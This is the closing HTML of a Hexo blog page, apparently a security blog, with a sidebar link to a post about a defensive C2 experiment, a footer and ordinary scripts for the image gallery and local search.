        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>é˜²å¾¡æ€§C2ç©å…·å°è¯•</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
